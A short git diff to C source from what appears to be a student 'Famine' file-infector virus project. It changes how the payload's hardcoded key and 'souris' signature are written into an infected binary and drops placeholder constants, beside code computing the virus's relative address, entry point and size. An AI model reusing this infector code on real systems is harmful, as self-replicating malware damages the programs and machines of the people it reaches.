@@ -58,8 +58,10 @@
 */
 
 # define CALL_INSTR_SIZE	5 /* sizeof "call mark_below" -> e8 2000 0000 */
-# define SECRET_SIGNATURE	(char[10]){'4','2','R','e','m','b','l','a','i','\0'}
+# define SECRET_KEY		(char[10]){'4','2','R','e','m','b','l','a','i','\0'}
 # define SECRET_LEN		10
+# define SIGNATURE		(char[6]){'s','o','u','r','i','s'}
+# define SIGNATURE_LEN		6
 
 static void	generate_key(char *buffer, size_t len)
 {
@@ -69,7 +71,8 @@ static void	generate_key(char *buffer, size_t len)
 static void	init_constants(struct client_info *constants, \
 			const struct entry *clone_entry)
 {
-	ft_memcpy(constants->key, SECRET_SIGNATURE, SECRET_LEN);
+	ft_memcpy(constants->signature, SIGNATURE, SIGNATURE_LEN);
+	ft_memcpy(constants->key, SECRET_KEY, SECRET_LEN);
 	generate_key((char *)constants->key + SECRET_LEN, 16 - SECRET_LEN);
 
 	const size_t		end_of_last_section = clone_entry->end_of_last_section;
@@ -83,9 +86,6 @@ static void	init_constants(struct client_info *constants, \
 	constants->relative_virus_address   = (uint64_t)virus - (uint64_t)famine_entry;
 	constants->relative_entry_address   = rel_text - clone_entry->offset_in_section;
 	constants->virus_size               = (uint64_t)_start - (uint64_t)virus;
-
-	constants->fill_me[0]               = 0x00656d206c6c6966; // TMP
-	constants->fill_me[1]               = 0x00656d206c6c6966; // TMP
 }
 
 bool		setup_payload(const struct entry *clone_entry, const struct safe_pointer info)
